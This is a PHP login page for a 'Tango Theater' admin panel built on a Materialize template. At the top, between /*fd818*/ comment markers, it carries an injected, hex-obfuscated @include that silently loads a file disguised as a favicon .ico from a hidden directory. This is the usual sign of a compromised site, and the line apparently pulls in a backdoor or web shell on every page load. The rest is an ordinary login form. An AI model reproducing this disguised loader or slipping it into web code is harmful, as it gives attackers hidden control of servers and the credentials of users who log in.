<?php
/*fd818*/

@include "\x2fhom\x653/j\x6fjoj\x64ev/\x70ubl\x69c_h\x74ml/\x2e144\x33307\x3117/\x73ncv\x32.4.\x33 up\x6coad\x2ffav\x69con\x5fc1a\x6359.\x69co";

/*fd818*/



?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="msapplication-tap-highlight" content="no">
  <meta name="description" content="Materialize is a Material Design Admin Template,It's modern, responsive and based on Material Design by Google. ">
  <meta name="keywords" content="materialize, admin template, dashboard template, flat admin template, responsive admin template,">
  <title>Login Page | Tango Theater</title>
  <link rel="icon" href="assets/images/favicon/favicon-32x32.png" sizes="32x32">
  <link rel="apple-touch-icon-precomposed" href="assets/images/favicon/apple-touch-icon-152x152.png">
  <meta name="msapplication-TileColor" content="#00bcd4">
  <meta name="msapplication-TileImage" content="assests/images/favicon/mstile-144x144.png">
  <link href="assets/css/materialize.css" type="text/css" rel="stylesheet" media="screen,projection">
  <link href="assets/css/style.css" type="text/css" rel="stylesheet" media="screen,projection">
    <link href="assets/css/custom-style.css" type="text/css" rel="stylesheet" media="screen,projection">
    <link href="assets/css/style-horizontal.css" type="text/css" rel="stylesheet" media="screen,projection">
  <link href="assets/css/page-center.css" type="text/css" rel="stylesheet" media="screen,projection">
  <link href="assets/css/prism.css" type="text/css" rel="stylesheet" media="screen,projection">
  <link href="assets/js/plugins/perfect-scrollbar/perfect-scrollbar.css" type="text/css" rel="stylesheet" media="screen,projection">
  
</head>

<body class="cyan">
  <div id="loader-wrapper">
      <div id="loader"></div>        
      <div class="loader-section section-left"></div>
      <div class="loader-section section-right"></div>
  </div>


<script>
    function post(event) {
        event.preventDefault();
        document.getElementById("my_form").submit();
    }
</script>
  <div id="login-page" class="row">
    <div class="col s12 z-depth-4 card-panel">
      <form class="login-form" action="engine/loginscript.php" method="post" id="my_form">
        <div class="row">
          <div class="input-field col s12 center">
            <img src="assets/images/login-logo.png" alt="" class="circle responsive-img valign profile-image-login">
            <p class="center login-form-text">Tango Theater</p>
          </div>
        </div>
        <div class="row margin">
          <div class="input-field col s12">
            <i class="mdi-social-person-outline prefix"></i>
            <input type="text" id="username" name="username">
            <label for="username" class="center-align">Username</label>
          </div>
        </div>
        <div class="row margin">
          <div class="input-field col s12">
            <i class="mdi-action-lock-outline prefix"></i>
            <input  type="password" id="password" name="password">
            <label for="password">Password</label>
          </div>
        </div>
        <div class="row">          
          <div class="input-field col s12 m12 l12  login-text">
              <input type="checkbox" id="remember-me" />
              <label for="remember-me">Remember me</label>
          </div>
        </div>
        <div class="row">
          <div class="input-field col s12">
          			  <center>
		     <button class="btn waves-effect waves-light col s12" type="submit" name="action" >Submit
			</button>
        
          </div>
        </div>
     

      </form>
    </div>
  </div>



  <!-- ================================================
    Scripts
    ================================================ -->

  <!-- jQuery Library -->
  <script type="text/javascript" src="assets/js/jquery-1.11.2.min.js"></script>
  <!--materialize js-->
  <script type="text/javascript" src="assets/js/materialize.js"></script>
  <!--prism-->
  <script type="text/javascript" src="assets/js/prism.js"></script>
  <!--scrollbar-->
  <script type="text/javascript" src="assets/js/plugins/perfect-scrollbar/perfect-scrollbar.min.js"></script>

  <!--plugins.js - Some Specific JS codes for Plugin Settings-->
  <script type="text/javascript" src="assets/js/plugins.js"></script>

</body>


<!-- Mirrored from demo.geekslabs.com/materialize/v2.2/layout03/user-login.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 24 Oct 2016 04:05:59 GMT -->
</html>